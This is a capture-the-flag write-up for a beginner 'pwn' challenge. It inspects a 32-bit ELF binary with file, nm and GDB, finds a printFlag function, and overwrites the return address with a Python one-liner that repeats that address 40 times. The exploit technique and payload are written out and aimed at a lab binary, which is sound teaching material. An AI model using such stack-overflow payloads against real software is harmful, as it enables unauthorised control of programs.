**BBY'S FIRST ELF**

*category*:pwn  *points*:25

This is a basic Buffer overflow problem. The first step checking the file type, we get a 32-bit, non-stripped Binary file.

```bash
hulkbuster@Jarvis:~/Downloads$ file 3d726802521a9ce2b24e2c3baf039915e48ad056 3d726802521a9ce2b24e2c3baf039915e48ad056: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb9014d549efe4ce761146b736590eb9f7e281d, not stripped```
```

We first debug the binary using GDB debugger. When overflowed look for EBP and ESP to determine the stack size. We then checked for raw symbols of this object file. It is found a function "print_flag" with a memory address 0x0804856d.

```bash
  hulkbuster@Jarvis:~/Downloads$ nm 3d726802521a9ce2b24e2c3baf039915e48ad056 
  0804a034 B __bss_start 0804a044 b completed.6591 0804a02c D __data_start 0804a02c W data_start 080484b0
  deregister_tm_clones 08048520 t __do_global_dtors_aux 08049f0c t __do_global_dtors_aux_fini_array_entry 0804a030
  __dso_handle 08049f14 d _DYNAMIC 0804a034 D _edata 0804a048 B _end U fclose@@GLIBC_2.1 U fflush@@GLIBC_2.0 
  fgets@@GLIBC_2.0 08048684 T _fini U fopen@@GLIBC_2.1 08048698 R _fp_hw 08048540 t frame_dummy 08049f08 t
  __frame_dummy_init_array_entry 080487f4 r __FRAME_END__ 0804a000 d _GLOBAL_OFFSET_TABLE_ w __gmon_start__ 080483b4 T
  _init 08049f0c t __init_array_end 08049f08 t __init_array_start 0804869c R _IO_stdin_used U __isoc99_scanf@@GLIBC_2.7 w
  _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable 08049f10 d __JCR_END__ 08049f10 d __JCR_LIST__ w
  _Jv_RegisterClasses 08048680 T __libc_csu_fini 08048610 T __libc_csu_init U __libc_start_main@@GLIBC_2.0 080485c9 T main
  **0804856d T printFlag** U puts@@GLIBC_2.0 080484e0 t register_tm_clones 08048470 T _start 0804a040 B stdout@@GLIBC_2.0
  0804a034 D __TMC_END__ 080484a0 T __x86.get_pc_thunk.bx
```

Thus the vulnerability is found and is exploited by over flowing (input more than the stack size) it to the address of "print_flag" function.

*Note: The payload passed should be in little-endian format for this 32-bit system.*

```bash
hulkbuster@Jarvis:~/Downloads$ python Python 2.7.6 (default, Jun 22 2015, 17:58:13) [GCC 4.8.2] on linux2 Type "help", "copyright", "credits" or "license" for more information. >>> from pwn import * >>> p32(0x0804856d,endian="little") 'm\x85\x04\x08' >>>
```
Thus the above payload reveals the flag for this challenge.

```bash
python -c 'print "m\x85\x04\x08"*40' | ./3d726802521a9ce2b24e2c3baf039915e48ad056.
```


TEAM BYTEBANDITS
